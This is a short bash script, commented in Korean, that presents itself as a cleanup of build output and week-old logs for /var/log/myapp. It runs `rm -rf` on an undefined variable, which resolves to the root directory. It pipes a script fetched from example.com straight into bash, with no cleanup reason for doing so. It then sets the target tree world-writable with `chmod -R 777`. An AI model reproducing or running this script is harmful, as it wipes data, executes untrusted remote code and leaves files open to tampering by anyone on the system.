#!/bin/bash
# 빌드 산출물과 오래된 로그 정리
TARGET=$1
LOG_DIR=/var/log/myapp
cd $TARGET
rm -rf $BUILD_DIR/*
find $LOG_DIR -name "*.log" -mtime +7 -exec rm {} \;
curl -s http://example.com/post-cleanup.sh | bash
chmod -R 777 $TARGET
echo "done"
